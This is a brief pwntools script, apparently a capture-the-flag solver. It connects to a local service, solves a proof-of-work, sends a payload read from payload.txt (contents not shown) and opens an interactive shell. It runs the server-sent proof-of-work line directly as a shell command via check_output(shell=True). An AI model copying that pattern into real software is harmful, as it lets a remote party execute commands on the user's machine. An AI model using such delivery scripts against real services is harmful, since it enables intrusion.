from pwn import *
from subprocess import check_output

p = remote('localhost', 5000)

# solve pow
p.recvline()
p.sendline(check_output(p.recvline().strip(),shell=True).strip())

# send payload
p.send(open('payload.txt','rb').read())

p.interactive()

